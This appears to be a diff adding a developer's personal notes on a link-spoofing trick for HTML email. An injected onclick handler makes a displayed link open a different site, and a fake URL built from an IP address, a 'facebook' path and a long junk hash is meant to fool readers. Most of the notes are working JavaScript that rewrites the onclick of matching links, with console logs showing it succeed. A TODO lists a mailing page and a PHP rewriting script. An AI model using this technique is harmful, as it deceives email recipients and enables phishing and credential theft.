@@ -1,0 +1,91 @@
+# the idea ? actually simple! it goes like so:
+
+# it seems we can have a link ( "<a>" with a certain href in received mail ( as well as CSS, but that's another story ( .. ) ) that goes somewhere else
+# for this to work with an inline "onclick" attribute, a 'return false' did not do the trick, BUT APPENDING AN ALERT BEFORE IT DID :D !
+
+# so, the next step is to build a html page that'd be sent by mail, with an href pointing to a 'I-got-too-complicated-hash-in-my-url-for-a-secure-website'
+# the trick is done adding the following code:
+onclick="alert('you will be redirected ... not to the website you thought :D !'); window.open('http://www.google.fr','_blank');"
+# ( replace the url by the website you'd like to be redirected to -> also, it's better if it's just an ip ( this way, we can have the maximum of 'fake auth hash part' in the url displayed ) )
+# this will actually mislead most of the user not knowing how the http protocol works & how addresses are formatted,
+# aka, a website with an url of 'http://193.593.594.495/protocol?https/www.facebook.com?dfgdfgf48Z4574Z657sdfxgxfgdfg9Z84584Z58485Z8xxfgdfg...' will actually mislead most of them
+
+# as a quick test without implementing some stuff involving url rewriting, the following url has been used with success after manual injection in a mail's webpage
+
+https://www.google.fr/?gws_rd=s&sdfgdfgsfgdfgsfg45645647566786867fhvhfxfgdfgdghdfg6756756756756fghcfxfgdfgfgR6456456456456dfgcfgcgbcgh5656456456456dfbcfgcvgE564564564cvcfgfy465456456hfghfghfgh456456546456456fhfghfgsersdsdrr3453453'this-is-the-correct-website-this-is-sooooooooooo-safe-it-actually-corresponds-exactly-to-the-link-you-clicked-on-your-mail-and-that-is-why-here-you-can-read-the-name-of-the-website-THE-SUPER-WEBSITE-THAT-HAS-TOO-MANY-TIMES-TOO-LONG-HASH-THAT-IT-CONFUSES-THE-USER
+
+TODO ?
+
+- barebone html page for mailing with such link(s)
+- php script & url rewriting to make up the sauce
+- going to the sea to do some fishing or reverse engineer some friendly lazy ass ? Nope ! => keep it under the hood when it may be needed ;p
+
+## Also, some neat javascript trick to iterate over elements selected with 'querySelectorAll' ( 'querySelector' should be fine as is )
+[].forEach.call( document.querySelectorAll('a[href="http://www.myrobots.com"]'), 
+  function(el){
+    //doStuffWith(el);
+    console.log('LINK POITING TO MYROBOTS FOUND ! -> BEFORE URL OVERRIDE ..'); console.debug(el);
+    el.setAttribute('onclick', 'window.open("https://www.google.fr/")' ); // may need the alert() stuff to work (..) 
+    console.log('LINK POITING TO MYROBOTS FOUND ! -> AFTER URL OVERRIDE ..'); console.debug(el);
+  } 
+);
+
+## or we could have done so in two steps:
+# get all the elements
+var myElemsArray = document.querySelectorAll('a[href="http://www.myrobots.com"]');
+# change their stuff
+[].forEach.call( myElemsArray,
+  function(el){
+    //doStuffWith(el);
+    console.log('LINK POITING TO MYROBOTS FOUND ! -> BEFORE URL OVERRIDE ..'); console.debug(el);
+    el.setAttribute('onclick', 'window.open("https://www.google.fr/")' ); // may need the alert() stuff to work (..) 
+    console.log('LINK POITING TO MYROBOTS FOUND ! -> AFTER URL OVERRIDE ..'); console.debug(el);
+  } 
+);
+
+
+
+## even better to do some tests ( encapsulates most of the pain ( .. ) )
+# the change function
+var testChange = function(){ 
+  [].forEach.call( document.querySelectorAll('a[href="http://www.myrobots.com"]'), 
+    function(el){
+      //doStuffWith(el);
+      console.log('LINK POITING TO MYROBOTS FOUND ! -> BEFORE URL OVERRIDE ..'); console.debug(el);
+      el.setAttribute('onclick', 'window.open("https://www.oppp.fr/")' ); // may need the alert() stuff to work (..) 
+      console.log('LINK POITING TO MYROBOTS FOUND ! -> AFTER URL OVERRIDE ..'); console.debug(el);
+    } 
+  );
+};
+# the timeout callback caller function
+var executeFcnAfter = function(timeout, callbackFcn){
+  setTimeout(function(){ callbackFcn }, timeout);
+};
+# the actuall call to setup a callback function & after how long it has to be invoked
+executeFcnAfter(5000, testChange);
+
+
+
+
+
+### -- Finally, without even the need for an alert box ;D -- ###
+# full code
+var testChange = function(){ 
+  [].forEach.call( document.querySelectorAll('a[href="http://www.myrobots.com"]'), 
+    function(el){
+      //doStuffWith(el);
+      el.setAttribute('onclick', 'window.open("https://www.google.fr/")' ); // may need the alert() stuff to work (..) 
+      console.log('LINK POITING TO MYROBOTS FOUND ! -> AFTER URL OVERRIDE ..'); console.debug(el);
+    } 
+  );
+};
+undefined
+var executeFcnAfter = function(timeout, callbackFcn){
+  setTimeout(function(){ callbackFcn() }, timeout);
+};
+undefined
+executeFcnAfter(5000, testChange);
+undefined
+LINK POITING TO MYROBOTS FOUND ! -> AFTER URL OVERRIDE .. VM14126:7
+# LOGS: <a href=​"http:​/​/​www.myrobots.com" target=​"_blank" onclick=​"window.open("https:​/​/​www.google.fr/​")​">​…​</a>​
+# then, when clicking on the link, the magic happens: we go to .. google, and not myrobots, EVEN IF WE ARE IN A MAIL (!) --> if this also works when code is present BEFORE rendering the page, this is a HooLE !
